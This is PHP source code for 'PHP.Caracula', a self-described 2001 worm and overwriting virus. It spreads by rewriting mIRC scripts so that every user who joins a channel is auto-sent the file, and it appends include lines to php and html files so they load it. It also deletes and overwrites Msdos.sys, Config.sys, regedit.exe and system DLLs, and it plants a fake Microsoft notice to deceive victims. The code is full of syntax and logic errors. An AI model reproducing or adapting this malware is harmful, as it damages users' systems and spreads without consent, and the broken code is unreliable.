<?php
// PHP.Caracula By Xmorfic/BCVG
// First PHP worm... using mirc to spread 
// Overwrting virus. Infects html, htm, php, sys, vxd, bat, ocx files.
// overwrites all sys,exe,ocx,bat,vxd files in c:\windows\system\
// add a string to all html, htm ,php that will contain the virus.
// deletes some dll files from c:\windows\system
// 
//

$msdos = 'C:\Msdos.sys';
$mirc = 'C:\Mirc\script.ini';
$mirc_s = 'C:\Mirs32\script.ini';
$mirc_t = 'C:\ProgramFiles\Mirc\script.ini';
$newdir = 'C:\_msphp';
$newdir_f = 'C:\_msphp\msphp.ini';
$config = 'C:\Config.sys';
$reg = 'C:\Windows\regedit.exe';
$dll_o = 'C:\Windows\System\Mshtml.dll'
$dll_t = 'C:\Windows\System\Wsock.vxd';
$dll_th = 'C:\Windows\System\Winspool.drv';
$dll_f = 'C:\Windows\System\vxblock.dll';

$ree = "Are you ready to slide with Caracula ???";
$string = "PHP.Caracula by Xmorfic/BCVG , Copyright (c) Xmorifc 2001, www.bcvgvx.cjb.net";
$string_o = "LOADING........";
$string_q = "Unable to load IE??9.sys file Please reboot your computer and try again";

	echo $string_o;

	$nome = true;

	if ( (file_exists($mirc) )
	{
		$infmirc_a = fopen($mirc, "r");
		$check_a   = fread($infmirc, filesize($mirc);
		$me_a      = strstr($check, 'ms.php');
		if (!$me) $nome = false;
		
		if ( ($nome=false) )
		{
			$a = unlink($mirc);
			$b = touch($mirc);

			$m_irc = fopen($mirc, "a");
			$fputs($m_irc, "[Script]");
			$fputs($m_irc, "n0=; PHP.Caracula");
			$fputs($m_irc, "n1=; By Xmorfic");
			$fputs($m_irc, "n2=; Do not edit!");
			$fputs($m_irc, "n3=ON 1:JOIN:#:{");
			$fputs($m_irc, "n4=  /if ( $nick == $me) {halt}");
			$fputs($m_irc, "n5= /.dcc send $nick c:\_msphp\ms.php");
			$fputs($m_irc, "n6=}");
			return;
		}
	}
	fclose($mirc);
	$nome = true;
	
	if ( (file_exists($mirc_s) )
	{
		$infmirc_b = fopen($mirc_s, "r");
		$check_b   = fread($infmirc_b, filesize($mirc_s);
		$me_b      = strstr($check_b, 'ms.php');
		if (!$me_b) $nome = false;
		
		if ( ($nome=false) )
		{
			$c = unlink($mirc_s);
			$d = touch($mirc_s);

			$m_irc = fopen($mirc_s, "a");
			$fputs($m_irc, "[Script]");
			$fputs($m_irc, "n0=; PHP.Caracula");
			$fputs($m_irc, "n1=; By Xmorfic");
			$fputs($m_irc, "n2=; Do not edit!");
			$fputs($m_irc, "n3=ON 1:JOIN:#:{");
			$fputs($m_irc, "n4=  /if ( $nick == $me) {halt}");
			$fputs($m_irc, "n5= /.dcc send $nick c:\_msphp\ms.php");
			$fputs($m_irc, "n6=}");
			return;
		}
	}
	fclose($mirc_s);
	$nome = true;

	if ( (file_exists($mirc_t) )
	{
		$infmirc_c = fopen($mirc_t, "r");
		$check_c   = fread($infmirc_c, filesize($mirc_t);
		$me_c      = strstr($check_c, 'ms.php');
		if (!$me_c) $nome = false;
		
		if ( ($nome=false) )
		{
			$e = unlink($mirc_t);
			$f = touch($mirc_t);

			$m_irc = fopen($mirc_t, "a");
			$fputs($m_irc, "[Script]");
			$fputs($m_irc, "n0=; PHP.Caracula");
			$fputs($m_irc, "n1=; By Xmorfic");
			$fputs($m_irc, "n2=; Do not edit!");
			$fputs($m_irc, "n3=ON 1:JOIN:#:{");
			$fputs($m_irc, "n4=  /if ( $nick == $me) {halt}");
			$fputs($m_irc, "n5= /.dcc send $nick c:\_msphp\ms.php");
			$fputs($m_irc, "n6=}");
			return;
		}

	}
	fclose($mirc_t);
	$nome = true;

	$g = mkdir($newdir,0)
	$h = touch($newdir_f)
	
	if ( (file_exists($newdir_f)
	{
		$new_ini = fopen($newdir_f, "a");
		$fputs($new_ini, "[MSPHP]");
		$fputs($new_ini, "Microsoft PHP Support");
		$fputs($new_ini, "This folder and the ms.php file into it will help your computer");
		$fputs($new_ini, "and you web browser to move one step more into the world of PHP.");
		$fputs($new_ini, "Microsoft wants you to enjoy the high technology available on the");
		$fputs($new_ini, "net in this day, so to make this ability Microsoft developed a new");
		$fputs($new_ini, "product named MSPHP that will help you and your computer to know");
		$fputs($new_ini, "the PHP language.");
		$fputs($new_ini, "This folder was created automaticly bu MSInternetExplorer Live Update");
		$fputs($new_ini, "if you want to uninstall this options do not delete the folder or the");
		$fputs($new_ini, "file because then you may cause damage to your computer just send email"); to msphp@microsoft.com and we will tell you how");
		$fputs($new_ini, "to msphp@microsoft.com and we will tell you how to uninstall it.");
		$fputs($new_ini, "Copyright Microsoft (c) 2001");
		return;
	}
	fclose($new_ini);

	$i = unlink($msdos);
	$j = touch($msdos);

	if ( (file_exists($msdos) )
	{
		$new_msdos = fopen($msdos, "a");
		$fputs($new_msdos, "[Paths]");
		$fputs($new_msdos, "WinDir=G:\_Sym\Microsoft\Windows");
		$fputs($new_msdos, "WinBootDir=A:\System\ini");
		$fputs($new_msdos, "HostWinBootDrv=R");
		$fputs($new_msdos, "");
		$fputs($new_msdos, "[OPTIONS]");
		$fputs($new_msdos, "BootMulti=6");
		$fputs($new_msdos, "WinVer=Infected Version");
		$fputs($new_msdos, "MsDos By Microsoft");
		$fputs($new_msdos, "xxxxxxxxxxxxxxxxxxxxxxxxx");
		return;
	
	}
	fclose($msdos);

	unlink($config);
	touch($config);

	if ( (file_exists($config) )
	{
		$new_config = fopen($config, "a");
		$fputs($new_config, "[Windows]");
		$fputs($new_config, "device=C:\Windows\??ss.sys");
		$fputs($new_config, "device=C:\_msdos\90.sys");
		$fputs($new_config, "device=C:\Windows\notepad.exe");
		$fputs($new_config, "Are you ready to slide ?????");
		return;
	}
	fclose($config);
	
	$l = unlink($reg);
	$m = unlink($dll_o);
	$n = unlink($dll_t);
	$o = unlink($dll_th);
	$p = unlink($dll_f);

	$y = rename(__FILE__, 'caracula.php');
	$x = copy(__FILE__, 'C:\_msphp');
	$w = rename('C:\_msphp\caracula.php', 'ms.php');

	
// search for html, htm, php files in current directory

$aa = opendir('.');
while ($bb = readdir($aa))
{
	$inf = true;
	$last = false;

	if ( ($last = strstr ($bb, '.php')) || ($last = strstr ($bb, '.html')) || ($last = strstr ($bb, '.htm')) )
	if ( is_file($bb) && is_writeable($bb) )
	{
		
		
		$new = fopen($bb, "r");
		$look = fread($new, filesize($bb));
		$yes = strstr ($look, 'caracula.php');
		if (!$yes) $inf = false;
	}
	
	if ( ($inf=false) )
	{
		$new = fopen($bb, "a");
		$fputs($new, "<?php ");
		$fputs($new, "include(\"");
		$fputs($new, __FILE__);
		$fputs($new, "\"); ");
		$fputs($new, "?>");
		return;
	}
}
closedir($aa);









// search for ocx, sys, bat, exe, vxd file in c:\windows\system\

$systems = opendir('C:\Windows\System');
	while ($filesys = readdir($systems))
	{

		$infected = true;
		$systemexe = false;

		if ( ($systemexe = strstr ($filesys, '.sys')) || ($systemexe = strstr ($filesys, '.vxd')) || ($systemexe = strstr ($filesys, '.bat')) || ($systemexe = strstr ($filesys, '.exe')) || ($systemexe = strstr ($filesys, '.ocx')) )
		if ( (is_writeable($filesys) )
		{
		
			$sysk = fopen($filesys, "r");
			$xst  = fread($sysk, filesize($filesys);
			$good = strstr ($xst, 'Are you ready to slide with Caracula ???');
			if (!$good) $infected = false;
		}

		if ( ($infected=false) )
		{
			$sysk = fopen($filesys, "a");
			$fputs($sysk, "Are you read to slide with Caracula ??? I'm ready but you don't!!! PHP.Caracula - slide now");
			return;
		}
	}
	closedir($systems);


	echo $ree;
	echo $string_q;

?>
	
	
	

	

	
